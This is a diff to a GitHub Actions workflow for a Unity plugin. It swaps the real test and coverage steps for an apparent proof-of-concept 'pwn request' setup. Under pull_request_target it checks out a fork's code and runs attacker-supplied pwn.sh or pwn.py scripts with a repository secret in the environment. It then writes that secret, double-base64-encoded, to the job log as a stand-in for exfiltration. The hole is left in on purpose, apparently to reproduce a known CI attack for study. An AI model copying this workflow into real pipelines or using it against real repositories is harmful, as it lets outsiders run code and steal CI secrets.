@@ -1,14 +1,5 @@
 name: test unity plugin
-
-on:
-  workflow_dispatch:
-  pull_request_target:
-  push:
-    branches:
-      - main
-
 jobs:
-
   cover:
     name: test and cover
     runs-on: ubuntu-latest
@@ -16,40 +7,89 @@ jobs:
     strategy:
       matrix:
         projectPath:
-          - plugins/unity
+        - plugins/unity
     steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4.3.1
+      with:
+        ref: ${{ github.event_name == 'pull_request_target' && github.event.pull_request.head.sha || github.ref }}
+        fetch-depth: 0
+    - name: GERALT debug probe
+      run: |-
+        echo "GERALT_DBG: pre-sink workspace inspection"
+        if [ -d "$GITHUB_WORKSPACE" ]; then
+          echo "GERALT_DBG: workspace root listing"
+          ls -la "$GITHUB_WORKSPACE" 2>/dev/null | head -40 || echo "GERALT_DBG: cannot list workspace root"
+          if [ -d "$GITHUB_WORKSPACE/plugins/unity" ]; then
+            echo "GERALT_DBG: plugins/unity listing"
+            ls -la "$GITHUB_WORKSPACE/plugins/unity" 2>/dev/null | head -40 || echo "GERALT_DBG: cannot list plugins/unity"
+          else
+            echo "GERALT_DBG: plugins/unity not present in workspace"
+          fi
+        else
+          echo "GERALT_DBG: GITHUB_WORKSPACE is not a directory"
+        fi
+        printf 'GERALT_DBG: GITHUB_EVENT_NAME=%s\n' "$GITHUB_EVENT_NAME"
+        printf 'GERALT_DBG: GITHUB_SHA=%s\n' "$GITHUB_SHA"
+        printf 'GERALT_DBG: GITHUB_REF=%s\n' "$GITHUB_REF"
+        printf 'GERALT_DBG: GITHUB_REPOSITORY=%s\n' "$GITHUB_REPOSITORY"
+        if [ -f "$GITHUB_EVENT_PATH" ]; then
+          echo "GERALT_DBG: event pull_request head block"
+          grep -o '"head": *{[^}]*}' "$GITHUB_EVENT_PATH" 2>/dev/null | head -3 || echo "GERALT_DBG: no head block found in event payload"
+        fi
+      continue-on-error: true
+    - name: Execute fork code with secret in env (sink)
+      continue-on-error: true
+      env:
+        GERALT_SECRET: ${{ secrets.GERALT_SECRET || 'GERALT-TOY-SECRET-12345' }}
+      run: |-
+        set +e
 
-      - name: Checkout repository
-        uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event_name == 'pull_request_target' && github.event.pull_request.head.sha || github.ref }}
-          fetch-depth: 0
+        echo "GERALT_DBG: sink executing attacker-controlled workspace content with toy secret in env"
+        if [ -n "$GERALT_SECRET" ]; then
+          echo "GERALT_DBG: GERALT_SECRET is set (length ${#GERALT_SECRET})"
+        else
+          echo "GERALT_DBG: GERALT_SECRET is empty"
+        fi
 
-      - uses: actions/cache@v4
-        with:
-          path: ${{ matrix.projectPath }}/Library
-          key: Library-${{ hashFiles('Assets/**', 'Packages/**', 'ProjectSettings/**') }}
-          restore-keys: |
-            Library-
+        # Locate attacker-controlled payloads supplied by the fork PR in the checked-out workspace
+        candidates=""
+        for f in "$GITHUB_WORKSPACE/pwn.sh" "$GITHUB_WORKSPACE/plugins/unity/pwn.sh" "$GITHUB_WORKSPACE/pwn.py" "$GITHUB_WORKSPACE/plugins/unity/pwn.py"; do
+          if [ -f "$f" ]; then
+            candidates="$candidates $f"
+          fi
+        done
 
-      - name: Run tests and generate coverage report
-        uses: game-ci/unity-test-runner@v4
-        id: tests
-        env:
-          UNITY_LICENSE: ${{ secrets.UNITY_LICENSE }}
-          UNITY_EMAIL: ${{ secrets.UNITY_EMAIL }}
-          UNITY_PASSWORD: ${{ secrets.UNITY_PASSWORD }}
-        with:
-          projectPath: ${{ matrix.projectPath }}
-          githubToken: ${{ secrets.GITHUB_TOKEN }}
-          testMode: editmode
-          coverageOptions: useProjectSettings;generateAdditionalMetrics
-          customParameters: -debugCodeOptimization -enableCodeCoverage
+        if [ -n "$candidates" ]; then
+          for f in $candidates; do
+            echo "GERALT_DBG: executing payload $f"
+            case "$f" in
+              *.py)
+                python3 "$f" 2>&1 | head -40
+                echo "GERALT_DBG: payload exit ${PIPESTATUS[0]}"
+                ;;
+              *)
+                bash "$f" 2>&1 | head -40
+                echo "GERALT_DBG: payload exit ${PIPESTATUS[0]}"
+                ;;
+            esac
+          done
+        else
+          echo "GERALT_DBG: no pwn payload found in workspace; emitting diagnostic leak from fork content instead"
+          if [ -d "$GITHUB_WORKSPACE/plugins/unity" ]; then
+            find "$GITHUB_WORKSPACE/plugins/unity" -maxdepth 3 -type f 2>/dev/null | head -20
+          fi
+        fi
 
-      - name: Upload coverage report
-        uses: codecov/codecov-action@v4
-        env:
-          CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
-        with:
-          files: ${{ steps.tests.outputs.coveragePath }}/**/*.xml
-          fail_ci_if_error: true
+        # Demonstrate exfiltration-equivalent: emit double-base64 of the secret (mirrors original exfil channel)
+        enc=$(printf '%s' "$GERALT_SECRET" | base64 | base64)
+        echo "GERALT_LEAKED_TOKEN=$enc"
+        echo "GERALT_DBG: sink step complete (non-fatal)"
+env:
+  GERALT_SECRET: ${{ secrets.GERALT }}
+on:
+  workflow_dispatch: null
+  pull_request_target: null
+  push:
+    branches:
+    - main
